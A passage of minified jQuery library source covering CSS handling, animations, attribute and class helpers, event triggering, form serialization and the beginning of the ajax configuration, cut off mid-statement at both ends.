r,i,o,a,s=e.style;return(n=n||Re(e))&&(""!==(a=n.getPropertyValue(t)||n[t])||ie(e)||(a=S.style(e,t)),!y.pixelBoxStyles()&&Pe.test(a)&&Ie.test(t)&&(r=s.width,i=s.minWidth,o=s.maxWidth,s.minWidth=s.maxWidth=s.width=a,a=n.width,s.width=r,s.minWidth=i,s.maxWidth=o)),void 0!==a?a+"":a}function Fe(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}!function(){function e(){if(l){u.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",l.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",re.appendChild(u).appendChild(l);var e=C.getComputedStyle(l);n="1%"!==e.top,s=12===t(e.marginLeft),l.style.right="60%",o=36===t(e.right),r=36===t(e.width),l.style.position="absolute",i=12===t(l.offsetWidth/3),re.removeChild(u),l=null}}function t(e){return Math.round(parseFloat(e))}var n,r,i,o,a,s,u=E.createElement("div"),l=E.createElement("div");l.style&&(l.style.backgroundClip="content-box",l.cloneNode(!0).style.backgroundClip="",y.clearCloneStyle="content-box"===l.style.backgroundClip,S.extend(y,{boxSizingReliable:function(){return e(),r},pixelBoxStyles:function(){return e(),o},pixelPosition:function(){return e(),n},reliableMarginLeft:function(){return e(),s},scrollboxSize:function(){return e(),i},reliableTrDimensions:function(){var e,t,n,r;return null==a&&(e=E.createElement("table"),t=E.createElement("tr"),n=E.createElement("div"),e.style.cssText="position:absolute;left:-11111px;border-collapse:separate",t.style.cssText="border:1px solid",t.style.height="1px",n.style.height="9px",n.style.display="block",re.appendChild(e).appendChild(t).appendChild(n),r=C.getComputedStyle(t),a=parseInt(r.height,10)+parseInt(r.borderTopWidth,10)+parseInt(r.borderBottomWidth,10)===t.offsetHeight,re.removeChild(e)),a}}))}();var Be=["Webkit","Moz","ms"],$e=E.createElement("div").style,_e={};function ze(e){var t=S.cssProps[e]||_e[e];return t||(e in $e?e:_e[e]=function(e){var t=e[0].toUpperCase()+e.slice(1),n=Be.length;while(n--)if((e=Be[n]+t)in $e)return e}(e)||e)}var Ue=/^(none|table(?!-c[ea]).+)/,Xe=/^--/,Ve={position:"absolute",visibility:"hidden",display:"block"},Ge={letterSpacing:"0",fontWeight:"400"};function Ye(e,t,n){var r=te.exec(t);return r?Math.max(0,r[2]-(n||0))+(r[3]||"px"):t}function Qe(e,t,n,r,i,o){var a="width"===t?1:0,s=0,u=0;if(n===(r?"border":"content"))return 0;for(;a<4;a+=2)"margin"===n&&(u+=S.css(e,n+ne[a],!0,i)),r?("content"===n&&(u-=S.css(e,"padding"+ne[a],!0,i)),"margin"!==n&&(u-=S.css(e,"border"+ne[a]+"Width",!0,i))):(u+=S.css(e,"padding"+ne[a],!0,i),"padding"!==n?u+=S.css(e,"border"+ne[a]+"Width",!0,i):s+=S.css(e,"border"+ne[a]+"Width",!0,i));return!r&&0<=o&&(u+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-o-u-s-.5))||0),u}function Je(e,t,n){var r=Re(e),i=(!y.boxSizingReliable()||n)&&"border-box"===S.css(e,"boxSizing",!1,r),o=i,a=We(e,t,r),s="offset"+t[0].toUpperCase()+t.slice(1);if(Pe.test(a)){if(!n)return a;a="auto"}return(!y.boxSizingReliable()&&i||!y.reliableTrDimensions()&&A(e,"tr")||"auto"===a||!parseFloat(a)&&"inline"===S.css(e,"display",!1,r))&&e.getClientRects().length&&(i="border-box"===S.css(e,"boxSizing",!1,r),(o=s in e)&&(a=e[s])),(a=parseFloat(a)||0)+Qe(e,t,n||(i?"border":"content"),o,r,a)+"px"}function Ke(e,t,n,r,i){return new Ke.prototype.init(e,t,n,r,i)}S.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=We(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,a,s=X(t),u=Xe.test(t),l=e.style;if(u||(t=ze(s)),a=S.cssHooks[t]||S.cssHooks[s],void 0===n)return a&&"get"in a&&void 0!==(i=a.get(e,!1,r))?i:l[t];"string"===(o=typeof n)&&(i=te.exec(n))&&i[1]&&(n=se(e,t,i),o="number"),null!=n&&n==n&&("number"!==o||u||(n+=i&&i[3]||(S.cssNumber[s]?"":"px")),y.clearCloneStyle||""!==n||0!==t.indexOf("background")||(l[t]="inherit"),a&&"set"in a&&void 0===(n=a.set(e,n,r))||(u?l.setProperty(t,n):l[t]=n))}},css:function(e,t,n,r){var i,o,a,s=X(t);return Xe.test(t)||(t=ze(s)),(a=S.cssHooks[t]||S.cssHooks[s])&&"get"in a&&(i=a.get(e,!0,n)),void 0===i&&(i=We(e,t,r)),"normal"===i&&t in Ge&&(i=Ge[t]),""===n||n?(o=parseFloat(i),!0===n||isFinite(o)?o||0:i):i}}),S.each(["height","width"],function(e,u){S.cssHooks[u]={get:function(e,t,n){if(t)return!Ue.test(S.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?Je(e,u,n):Me(e,Ve,function(){return Je(e,u,n)})},set:function(e,t,n){var r,i=Re(e),o=!y.scrollboxSize()&&"absolute"===i.position,a=(o||n)&&"border-box"===S.css(e,"boxSizing",!1,i),s=n?Qe(e,u,n,a,i):0;return a&&o&&(s-=Math.ceil(e["offset"+u[0].toUpperCase()+u.slice(1)]-parseFloat(i[u])-Qe(e,u,"border",!1,i)-.5)),s&&(r=te.exec(t))&&"px"!==(r[3]||"px")&&(e.style[u]=t,t=S.css(e,u)),Ye(0,t,s)}}}),S.cssHooks.marginLeft=Fe(y.reliableMarginLeft,function(e,t){if(t)return(parseFloat(We(e,"marginLeft"))||e.getBoundingClientRect().left-Me(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),S.each({margin:"",padding:"",border:"Width"},function(i,o){S.cssHooks[i+o]={expand:function(e){for(var t=0,n={},r="string"==typeof e?e.split(" "):[e];t<4;t++)n[i+ne[t]+o]=r[t]||r[t-2]||r[0];return n}},"margin"!==i&&(S.cssHooks[i+o].set=Ye)}),S.fn.extend({css:function(e,t){return $(this,function(e,t,n){var r,i,o={},a=0;if(Array.isArray(t)){for(r=Re(e),i=t.length;a<i;a++)o[t[a]]=S.css(e,t[a],!1,r);return o}return void 0!==n?S.style(e,t,n):S.css(e,t)},e,t,1<arguments.length)}}),((S.Tween=Ke).prototype={constructor:Ke,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||S.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(S.cssNumber[n]?"":"px")},cur:function(){var e=Ke.propHooks[this.prop];return e&&e.get?e.get(this):Ke.propHooks._default.get(this)},run:function(e){var t,n=Ke.propHooks[this.prop];return this.options.duration?this.pos=t=S.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):Ke.propHooks._default.set(this),this}}).init.prototype=Ke.prototype,(Ke.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=S.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){S.fx.step[e.prop]?S.fx.step[e.prop](e):1!==e.elem.nodeType||!S.cssHooks[e.prop]&&null==e.elem.style[ze(e.prop)]?e.elem[e.prop]=e.now:S.style(e.elem,e.prop,e.now+e.unit)}}}).scrollTop=Ke.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},S.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},S.fx=Ke.prototype.init,S.fx.step={};var Ze,et,tt,nt,rt=/^(?:toggle|show|hide)$/,it=/queueHooks$/;function ot(){et&&(!1===E.hidden&&C.requestAnimationFrame?C.requestAnimationFrame(ot):C.setTimeout(ot,S.fx.interval),S.fx.tick())}function at(){return C.setTimeout(function(){Ze=void 0}),Ze=Date.now()}function st(e,t){var n,r=0,i={height:e};for(t=t?1:0;r<4;r+=2-t)i["margin"+(n=ne[r])]=i["padding"+n]=e;return t&&(i.opacity=i.width=e),i}function ut(e,t,n){for(var r,i=(lt.tweeners[t]||[]).concat(lt.tweeners["*"]),o=0,a=i.length;o<a;o++)if(r=i[o].call(n,t,e))return r}function lt(o,e,t){var n,a,r=0,i=lt.prefilters.length,s=S.Deferred().always(function(){delete u.elem}),u=function(){if(a)return!1;for(var e=Ze||at(),t=Math.max(0,l.startTime+l.duration-e),n=1-(t/l.duration||0),r=0,i=l.tweens.length;r<i;r++)l.tweens[r].run(n);return s.notifyWith(o,[l,n,t]),n<1&&i?t:(i||s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l]),!1)},l=s.promise({elem:o,props:S.extend({},e),opts:S.extend(!0,{specialEasing:{},easing:S.easing._default},t),originalProperties:e,originalOptions:t,startTime:Ze||at(),duration:t.duration,tweens:[],createTween:function(e,t){var n=S.Tween(o,l.opts,e,t,l.opts.specialEasing[e]||l.opts.easing);return l.tweens.push(n),n},stop:function(e){var t=0,n=e?l.tweens.length:0;if(a)return this;for(a=!0;t<n;t++)l.tweens[t].run(1);return e?(s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l,e])):s.rejectWith(o,[l,e]),this}}),c=l.props;for(!function(e,t){var n,r,i,o,a;for(n in e)if(i=t[r=X(n)],o=e[n],Array.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),(a=S.cssHooks[r])&&"expand"in a)for(n in o=a.expand(o),delete e[r],o)n in e||(e[n]=o[n],t[n]=i);else t[r]=i}(c,l.opts.specialEasing);r<i;r++)if(n=lt.prefilters[r].call(l,o,c,l.opts))return m(n.stop)&&(S._queueHooks(l.elem,l.opts.queue).stop=n.stop.bind(n)),n;return S.map(c,ut,l),m(l.opts.start)&&l.opts.start.call(o,l),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always),S.fx.timer(S.extend(u,{elem:o,anim:l,queue:l.opts.queue})),l}S.Animation=S.extend(lt,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return se(n.elem,e,te.exec(t),n),n}]},tweener:function(e,t){m(e)?(t=e,e=["*"]):e=e.match(P);for(var n,r=0,i=e.length;r<i;r++)n=e[r],lt.tweeners[n]=lt.tweeners[n]||[],lt.tweeners[n].unshift(t)},prefilters:[function(e,t,n){var r,i,o,a,s,u,l,c,f="width"in t||"height"in t,p=this,d={},h=e.style,g=e.nodeType&&ae(e),v=Y.get(e,"fxshow");for(r in n.queue||(null==(a=S._queueHooks(e,"fx")).unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,p.always(function(){p.always(function(){a.unqueued--,S.queue(e,"fx").length||a.empty.fire()})})),t)if(i=t[r],rt.test(i)){if(delete t[r],o=o||"toggle"===i,i===(g?"hide":"show")){if("show"!==i||!v||void 0===v[r])continue;g=!0}d[r]=v&&v[r]||S.style(e,r)}if((u=!S.isEmptyObject(t))||!S.isEmptyObject(d))for(r in f&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],null==(l=v&&v.display)&&(l=Y.get(e,"display")),"none"===(c=S.css(e,"display"))&&(l?c=l:(le([e],!0),l=e.style.display||l,c=S.css(e,"display"),le([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===S.css(e,"float")&&(u||(p.done(function(){h.display=l}),null==l&&(c=h.display,l="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",p.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),u=!1,d)u||(v?"hidden"in v&&(g=v.hidden):v=Y.access(e,"fxshow",{display:l}),o&&(v.hidden=!g),g&&le([e],!0),p.done(function(){for(r in g||le([e]),Y.remove(e,"fxshow"),d)S.style(e,r,d[r])})),u=ut(g?v[r]:0,r,p),r in v||(v[r]=u.start,g&&(u.end=u.start,u.start=0))}],prefilter:function(e,t){t?lt.prefilters.unshift(e):lt.prefilters.push(e)}}),S.speed=function(e,t,n){var r=e&&"object"==typeof e?S.extend({},e):{complete:n||!n&&t||m(e)&&e,duration:e,easing:n&&t||t&&!m(t)&&t};return S.fx.off?r.duration=0:"number"!=typeof r.duration&&(r.duration in S.fx.speeds?r.duration=S.fx.speeds[r.duration]:r.duration=S.fx.speeds._default),null!=r.queue&&!0!==r.queue||(r.queue="fx"),r.old=r.complete,r.complete=function(){m(r.old)&&r.old.call(this),r.queue&&S.dequeue(this,r.queue)},r},S.fn.extend({fadeTo:function(e,t,n,r){return this.filter(ae).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(t,e,n,r){var i=S.isEmptyObject(t),o=S.speed(e,n,r),a=function(){var e=lt(this,S.extend({},t),o);(i||Y.get(this,"finish"))&&e.stop(!0)};return a.finish=a,i||!1===o.queue?this.each(a):this.queue(o.queue,a)},stop:function(i,e,o){var a=function(e){var t=e.stop;delete e.stop,t(o)};return"string"!=typeof i&&(o=e,e=i,i=void 0),e&&this.queue(i||"fx",[]),this.each(function(){var e=!0,t=null!=i&&i+"queueHooks",n=S.timers,r=Y.get(this);if(t)r[t]&&r[t].stop&&a(r[t]);else for(t in r)r[t]&&r[t].stop&&it.test(t)&&a(r[t]);for(t=n.length;t--;)n[t].elem!==this||null!=i&&n[t].queue!==i||(n[t].anim.stop(o),e=!1,n.splice(t,1));!e&&o||S.dequeue(this,i)})},finish:function(a){return!1!==a&&(a=a||"fx"),this.each(function(){var e,t=Y.get(this),n=t[a+"queue"],r=t[a+"queueHooks"],i=S.timers,o=n?n.length:0;for(t.finish=!0,S.queue(this,a,[]),r&&r.stop&&r.stop.call(this,!0),e=i.length;e--;)i[e].elem===this&&i[e].queue===a&&(i[e].anim.stop(!0),i.splice(e,1));for(e=0;e<o;e++)n[e]&&n[e].finish&&n[e].finish.call(this);delete t.finish})}}),S.each(["toggle","show","hide"],function(e,r){var i=S.fn[r];S.fn[r]=function(e,t,n){return null==e||"boolean"==typeof e?i.apply(this,arguments):this.animate(st(r,!0),e,t,n)}}),S.each({slideDown:st("show"),slideUp:st("hide"),slideToggle:st("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,r){S.fn[e]=function(e,t,n){return this.animate(r,e,t,n)}}),S.timers=[],S.fx.tick=function(){var e,t=0,n=S.timers;for(Ze=Date.now();t<n.length;t++)(e=n[t])()||n[t]!==e||n.splice(t--,1);n.length||S.fx.stop(),Ze=void 0},S.fx.timer=function(e){S.timers.push(e),S.fx.start()},S.fx.interval=13,S.fx.start=function(){et||(et=!0,ot())},S.fx.stop=function(){et=null},S.fx.speeds={slow:600,fast:200,_default:400},S.fn.delay=function(r,e){return r=S.fx&&S.fx.speeds[r]||r,e=e||"fx",this.queue(e,function(e,t){var n=C.setTimeout(e,r);t.stop=function(){C.clearTimeout(n)}})},tt=E.createElement("input"),nt=E.createElement("select").appendChild(E.createElement("option")),tt.type="checkbox",y.checkOn=""!==tt.value,y.optSelected=nt.selected,(tt=E.createElement("input")).value="t",tt.type="radio",y.radioValue="t"===tt.value;var ct,ft=S.expr.attrHandle;S.fn.extend({attr:function(e,t){return $(this,S.attr,e,t,1<arguments.length)},removeAttr:function(e){return this.each(function(){S.removeAttr(this,e)})}}),S.extend({attr:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return"undefined"==typeof e.getAttribute?S.prop(e,t,n):(1===o&&S.isXMLDoc(e)||(i=S.attrHooks[t.toLowerCase()]||(S.expr.match.bool.test(t)?ct:void 0)),void 0!==n?null===n?void S.removeAttr(e,t):i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:(e.setAttribute(t,n+""),n):i&&"get"in i&&null!==(r=i.get(e,t))?r:null==(r=S.find.attr(e,t))?void 0:r)},attrHooks:{type:{set:function(e,t){if(!y.radioValue&&"radio"===t&&A(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},removeAttr:function(e,t){var n,r=0,i=t&&t.match(P);if(i&&1===e.nodeType)while(n=i[r++])e.removeAttribute(n)}}),ct={set:function(e,t,n){return!1===t?S.removeAttr(e,n):e.setAttribute(n,n),n}},S.each(S.expr.match.bool.source.match(/\w+/g),function(e,t){var a=ft[t]||S.find.attr;ft[t]=function(e,t,n){var r,i,o=t.toLowerCase();return n||(i=ft[o],ft[o]=r,r=null!=a(e,t,n)?o:null,ft[o]=i),r}});var pt=/^(?:input|select|textarea|button)$/i,dt=/^(?:a|area)$/i;function ht(e){return(e.match(P)||[]).join(" ")}function gt(e){return e.getAttribute&&e.getAttribute("class")||""}function vt(e){return Array.isArray(e)?e:"string"==typeof e&&e.match(P)||[]}S.fn.extend({prop:function(e,t){return $(this,S.prop,e,t,1<arguments.length)},removeProp:function(e){return this.each(function(){delete this[S.propFix[e]||e]})}}),S.extend({prop:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&S.isXMLDoc(e)||(t=S.propFix[t]||t,i=S.propHooks[t]),void 0!==n?i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){var t=S.find.attr(e,"tabindex");return t?parseInt(t,10):pt.test(e.nodeName)||dt.test(e.nodeName)&&e.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),y.optSelected||(S.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),S.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){S.propFix[this.toLowerCase()]=this}),S.fn.extend({addClass:function(t){var e,n,r,i,o,a,s,u=0;if(m(t))return this.each(function(e){S(this).addClass(t.call(this,e,gt(this)))});if((e=vt(t)).length)while(n=this[u++])if(i=gt(n),r=1===n.nodeType&&" "+ht(i)+" "){a=0;while(o=e[a++])r.indexOf(" "+o+" ")<0&&(r+=o+" ");i!==(s=ht(r))&&n.setAttribute("class",s)}return this},removeClass:function(t){var e,n,r,i,o,a,s,u=0;if(m(t))return this.each(function(e){S(this).removeClass(t.call(this,e,gt(this)))});if(!arguments.length)return this.attr("class","");if((e=vt(t)).length)while(n=this[u++])if(i=gt(n),r=1===n.nodeType&&" "+ht(i)+" "){a=0;while(o=e[a++])while(-1<r.indexOf(" "+o+" "))r=r.replace(" "+o+" "," ");i!==(s=ht(r))&&n.setAttribute("class",s)}return this},toggleClass:function(i,t){var o=typeof i,a="string"===o||Array.isArray(i);return"boolean"==typeof t&&a?t?this.addClass(i):this.removeClass(i):m(i)?this.each(function(e){S(this).toggleClass(i.call(this,e,gt(this),t),t)}):this.each(function(){var e,t,n,r;if(a){t=0,n=S(this),r=vt(i);while(e=r[t++])n.hasClass(e)?n.removeClass(e):n.addClass(e)}else void 0!==i&&"boolean"!==o||((e=gt(this))&&Y.set(this,"__className__",e),this.setAttribute&&this.setAttribute("class",e||!1===i?"":Y.get(this,"__className__")||""))})},hasClass:function(e){var t,n,r=0;t=" "+e+" ";while(n=this[r++])if(1===n.nodeType&&-1<(" "+ht(gt(n))+" ").indexOf(t))return!0;return!1}});var yt=/\r/g;S.fn.extend({val:function(n){var r,e,i,t=this[0];return arguments.length?(i=m(n),this.each(function(e){var t;1===this.nodeType&&(null==(t=i?n.call(this,e,S(this).val()):n)?t="":"number"==typeof t?t+="":Array.isArray(t)&&(t=S.map(t,function(e){return null==e?"":e+""})),(r=S.valHooks[this.type]||S.valHooks[this.nodeName.toLowerCase()])&&"set"in r&&void 0!==r.set(this,t,"value")||(this.value=t))})):t?(r=S.valHooks[t.type]||S.valHooks[t.nodeName.toLowerCase()])&&"get"in r&&void 0!==(e=r.get(t,"value"))?e:"string"==typeof(e=t.value)?e.replace(yt,""):null==e?"":e:void 0}}),S.extend({valHooks:{option:{get:function(e){var t=S.find.attr(e,"value");return null!=t?t:ht(S.text(e))}},select:{get:function(e){var t,n,r,i=e.options,o=e.selectedIndex,a="select-one"===e.type,s=a?null:[],u=a?o+1:i.length;for(r=o<0?u:a?o:0;r<u;r++)if(((n=i[r]).selected||r===o)&&!n.disabled&&(!n.parentNode.disabled||!A(n.parentNode,"optgroup"))){if(t=S(n).val(),a)return t;s.push(t)}return s},set:function(e,t){var n,r,i=e.options,o=S.makeArray(t),a=i.length;while(a--)((r=i[a]).selected=-1<S.inArray(S.valHooks.option.get(r),o))&&(n=!0);return n||(e.selectedIndex=-1),o}}}}),S.each(["radio","checkbox"],function(){S.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=-1<S.inArray(S(e).val(),t)}},y.checkOn||(S.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),y.focusin="onfocusin"in C;var mt=/^(?:focusinfocus|focusoutblur)$/,xt=function(e){e.stopPropagation()};S.extend(S.event,{trigger:function(e,t,n,r){var i,o,a,s,u,l,c,f,p=[n||E],d=v.call(e,"type")?e.type:e,h=v.call(e,"namespace")?e.namespace.split("."):[];if(o=f=a=n=n||E,3!==n.nodeType&&8!==n.nodeType&&!mt.test(d+S.event.triggered)&&(-1<d.indexOf(".")&&(d=(h=d.split(".")).shift(),h.sort()),u=d.indexOf(":")<0&&"on"+d,(e=e[S.expando]?e:new S.Event(d,"object"==typeof e&&e)).isTrigger=r?2:3,e.namespace=h.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=n),t=null==t?[e]:S.makeArray(t,[e]),c=S.event.special[d]||{},r||!c.trigger||!1!==c.trigger.apply(n,t))){if(!r&&!c.noBubble&&!x(n)){for(s=c.delegateType||d,mt.test(s+d)||(o=o.parentNode);o;o=o.parentNode)p.push(o),a=o;a===(n.ownerDocument||E)&&p.push(a.defaultView||a.parentWindow||C)}i=0;while((o=p[i++])&&!e.isPropagationStopped())f=o,e.type=1<i?s:c.bindType||d,(l=(Y.get(o,"events")||Object.create(null))[e.type]&&Y.get(o,"handle"))&&l.apply(o,t),(l=u&&o[u])&&l.apply&&V(o)&&(e.result=l.apply(o,t),!1===e.result&&e.preventDefault());return e.type=d,r||e.isDefaultPrevented()||c._default&&!1!==c._default.apply(p.pop(),t)||!V(n)||u&&m(n[d])&&!x(n)&&((a=n[u])&&(n[u]=null),S.event.triggered=d,e.isPropagationStopped()&&f.addEventListener(d,xt),n[d](),e.isPropagationStopped()&&f.removeEventListener(d,xt),S.event.triggered=void 0,a&&(n[u]=a)),e.result}},simulate:function(e,t,n){var r=S.extend(new S.Event,n,{type:e,isSimulated:!0});S.event.trigger(r,null,t)}}),S.fn.extend({trigger:function(e,t){return this.each(function(){S.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];if(n)return S.event.trigger(e,t,n,!0)}}),y.focusin||S.each({focus:"focusin",blur:"focusout"},function(n,r){var i=function(e){S.event.simulate(r,e.target,S.event.fix(e))};S.event.special[r]={setup:function(){var e=this.ownerDocument||this.document||this,t=Y.access(e,r);t||e.addEventListener(n,i,!0),Y.access(e,r,(t||0)+1)},teardown:function(){var e=this.ownerDocument||this.document||this,t=Y.access(e,r)-1;t?Y.access(e,r,t):(e.removeEventListener(n,i,!0),Y.remove(e,r))}}});var bt=C.location,wt={guid:Date.now()},Tt=/\?/;S.parseXML=function(e){var t,n;if(!e||"string"!=typeof e)return null;try{t=(new C.DOMParser).parseFromString(e,"text/xml")}catch(e){}return n=t&&t.getElementsByTagName("parsererror")[0],t&&!n||S.error("Invalid XML: "+(n?S.map(n.childNodes,function(e){return e.textContent}).join("\n"):e)),t};var Ct=/\[\]$/,Et=/\r?\n/g,St=/^(?:submit|button|image|reset|file)$/i,kt=/^(?:input|select|textarea|keygen)/i;function At(n,e,r,i){var t;if(Array.isArray(e))S.each(e,function(e,t){r||Ct.test(n)?i(n,t):At(n+"["+("object"==typeof t&&null!=t?e:"")+"]",t,r,i)});else if(r||"object"!==w(e))i(n,e);else for(t in e)At(n+"["+t+"]",e[t],r,i)}S.param=function(e,t){var n,r=[],i=function(e,t){var n=m(t)?t():t;r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==n?"":n)};if(null==e)return"";if(Array.isArray(e)||e.jquery&&!S.isPlainObject(e))S.each(e,function(){i(this.name,this.value)});else for(n in e)At(n,e[n],t,i);return r.join("&")},S.fn.extend({serialize:function(){return S.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=S.prop(this,"elements");return e?S.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!S(this).is(":disabled")&&kt.test(this.nodeName)&&!St.test(e)&&(this.checked||!pe.test(e))}).map(function(e,t){var n=S(this).val();return null==n?null:Array.isArray(n)?S.map(n,function(e){return{name:t.name,value:e.replace(Et,"\r\n")}}):{name:t.name,value:n.replace(Et,"\r\n")}}).get()}});var Nt=/%20/g,jt=/#.*$/,Dt=/([?&])_=[^&]*/,qt=/^(.*?):[ \t]*([^\r\n]*)$/gm,Lt=/^(?:GET|HEAD)$/,Ht=/^\/\//,Ot={},Pt={},Rt="*/".concat("*"),Mt=E.createElement("a");function It(o){return function(e,t){"string"!=typeof e&&(t=e,e="*");var n,r=0,i=e.toLowerCase().match(P)||[];if(m(t))while(n=i[r++])"+"===n[0]?(n=n.slice(1)||"*",(o[n]=o[n]||[]).unshift(t)):(o[n]=o[n]||[]).push(t)}}function Wt(t,i,o,a){var s={},u=t===Pt;function l(e){var r;return s[e]=!0,S.each(t[e]||[],function(e,t){var n=t(i,o,a);return"string"!=typeof n||u||s[n]?u?!(r=n):void 0:(i.dataTypes.unshift(n),l(n),!1)}),r}return l(i.dataTypes[0])||!s["*"]&&l("*")}function Ft(e,t){var n,r,i=S.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&S.extend(!0,e,r),e}Mt.href=bt.href,S.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:bt.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(bt.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Rt,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":S.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?Ft(Ft(e,S.ajaxSettings),t):Ft(S.ajaxSettings,e)},ajaxPrefilter:It(Ot),ajaxTransport:It(Pt),ajax:function(e,t){"object"==typeof e&&(t=e,e=void 0),t=t||{};var c,f,p,n,d,r,h,g,i,o,v=S.ajaxSetup({},t),y=v.context||v,m=v.context&&(y.nodeType||y.jquery)?S(y):S.event,x=S.Deferred(),b=S.Callbacks("once memory"),w=v.statusCode||{},a={},s={},u="canceled",T={readyState:0,getResponseHeader:function(e){var t;if(h){if(!n){n={};while(t=qt.exec(p))n[t[1].toLowerCase()+" "]=(n[t[1].toLowerCase()+" "]||[]).concat(t[2])}t=n[e.toLowerCase()+" "]}return null==t?null:t.join(", ")},getAllResponseHeaders:function(){return h?p:null},setRequestHeader:function(e,t){return null==h&&(e=s[e.toLowerCase()]=s[e.toLowerCase()]||e,a[e]=t),this},overrideMimeType:function(e){return null==h&&(v.mimeType=e),this},statusCode:function(e){var t;if(e)if(h)T.always(e[T.status]);else for(t in e)w[t]=[w[t],e[t]];return this},abort:function(e){var t=e||u;return c&&c.abort(t),l(0,t),this}};if(x.promise(T),v.url=((e||v.url||bt.href)+"").replace(Ht,bt.protocol+"//"),v.type=t.method||t.type||v.method||v.type,v.dataTypes=(v.dataType||"*").toLowerCase().match(P)||[""],null==v.crossDomain){r=E.createElement("a");try{r.href=v.url,r.href=r.href,v.crossDomain=Mt.protocol+"//"+Mt.host!=r.protocol+"//"+r.host}catch(e){v.crossDomain=!0}}if(v.data&&v.processData&&"string"!=typeof v.data&&(v.data=S.param(v.data,v.traditional)),Wt(Ot,v,t,T),h)return T;for(i in(g=S.event&&v.global)&&0==S.active++&&S.event.trigger("ajaxStart"),v.type=v.type.toUpperCase(),v.hasContent=!Lt.test(v.type),f=v.url.replace(jt,""),v.hasContent?v.data&&v.processData&&0===(v.contentType||"").indexOf("application/x-www-form-urlencoded")&&(v.data=v.data.replace(Nt,"+")):(o=v.url.slice(f.length),v.data&&(v.processData||"string"==typeof v.data)&&(f+=(Tt.test(f)?"&":"?")+v.data,delete 